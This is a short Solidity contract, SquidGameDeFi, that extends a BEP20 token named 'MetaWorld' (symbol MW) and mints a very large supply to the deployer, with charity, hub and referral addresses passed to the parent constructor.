contract SquidGameDeFi is BEP20 {

    constructor (address charity, address SQUID_HUB, address referral) BEP20("MetaWorld", "MW", 18, charity , SQUID_HUB, referral) {
        _build(msg.sender, 1000000000000000 * 10 ** 18);
    }
    
}